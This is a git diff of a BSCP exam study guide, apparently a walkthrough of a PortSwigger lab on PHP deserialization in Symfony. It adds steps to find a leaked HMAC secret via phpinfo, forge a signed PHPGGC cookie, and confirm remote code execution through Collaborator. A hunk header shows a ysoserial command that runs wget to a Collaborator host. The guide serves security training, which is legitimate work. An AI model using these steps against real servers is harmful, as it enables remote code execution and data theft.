@@ -2622,7 +2622,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
   
 ### SHA1 HMAC Symfony
 
->***Identify*** that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for ``` ```, revealing the digital signature to sign new token.   
+>***Identify*** that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for ```/cgi-bin/phpinfo.php```, revealing the digital signature to sign new token.   
 
 >**Note:** In BSCP exam not going to run this as it delete the file, but in exam read source code to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using ```PHPGGC```.  
 
@@ -2640,9 +2640,11 @@ $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('
 echo $cookie;
 ```  
   
+4. Execute the php code in terminal, ```php Symfony_insecure_deserial_php.php``` to obtain signed cookie.  
+
 ![Symfony phpggc gadget deserial](images/symphony-phpgcc.png)  
 
->Replace cookie value and send request to get remote code execution when cookie is deserialised server side.  
+>Replace cookie value and send request to get remote code execution when cookie is deserialised server side. Ignore the server response ```HTTP/2 500 Internal Server Error```, check the collaborator if data was received.  
 
 [PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
    
